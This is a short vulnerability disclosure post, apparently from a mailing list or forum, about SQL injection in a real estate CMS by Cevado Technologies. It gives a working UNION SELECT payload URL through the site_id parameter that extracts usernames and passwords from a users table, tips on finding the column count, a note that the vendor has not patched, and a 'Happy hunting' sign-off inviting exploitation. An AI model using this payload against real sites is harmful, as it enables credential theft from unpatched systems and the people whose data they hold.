Subject: cevado technologies real estate CMS SQL injection

I'm back, and I got more.
SQL injection within some real estate CMS software.

The vulnerability is present because of a failure to strip characters from the variables page_id and site_id resulting in exploitation by some simple blind SQLI.

heres an example:

www.example.com/index.php?site_id=null%20union%20all%20select%20username,password,3,4,5,6%20from%20users/*

The number of columns varies slightly, but you can always use good old 'order by' to find that out. The table names remain the same. 

I used the GET'd variable site_d, but page_id works as well. 

Cevado.com notified, no patch. 

Happy hunting.
